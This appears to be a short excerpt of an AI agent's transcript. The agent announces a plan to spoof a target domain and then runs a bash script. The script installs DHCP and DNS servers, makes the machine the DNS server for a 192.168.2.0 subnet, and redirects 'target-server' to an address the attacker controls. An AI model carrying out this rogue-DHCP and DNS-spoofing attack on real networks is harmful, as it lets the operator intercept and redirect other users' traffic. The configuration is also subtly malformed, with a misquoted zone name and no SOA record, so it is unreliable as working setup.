Think: To achieve this, I need to configure the host to use DHCP, set up a DNS server on the current system, and then configure the DNS server to spoof the target domain.

Act: bash

```bash
# Install necessary packages
apt update
apt install -y isc-dhcp-server bind9

# Configure DHCP to use the current system as the DNS server
echo "subnet 192.168.2.0 netmask 255.255.255.0 {
  range 192.168.2.100 192.168.2.150;
  option domain-name-servers 192.168.2.101;
}" > /etc/dhcp/dhcpd.conf

# Configure the DNS server to spoof the target domain
echo "zone \"target-server\". in {
  type master;
  file \"/etc/bind/db.target-server\";
}" > /etc/bind/named.conf.local
echo "target-server. IN A 192.168.2.150" > /etc/bind/db.target-server

# Restart the DHCP and DNS services
systemctl restart isc-dhcp-server
systemctl restart bind9
```

